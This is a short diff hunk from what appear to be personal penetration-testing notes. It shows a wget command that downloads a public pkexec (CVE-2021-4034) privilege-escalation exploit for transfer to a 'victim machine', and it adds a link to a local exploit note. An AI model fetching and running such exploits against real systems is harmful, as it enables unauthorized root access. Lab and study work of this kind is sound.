@@ -283,6 +283,7 @@ The exploit https://github.com/Almorabea/pkexec-exploit
 ```shell
 wget https://raw.githubusercontent.com/Almorabea/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
 ```
+Or the code [[CVE-2021-4034-exploit\|CVE-2021-4034-exploit]]
 
 And transfer to the victim machine
 
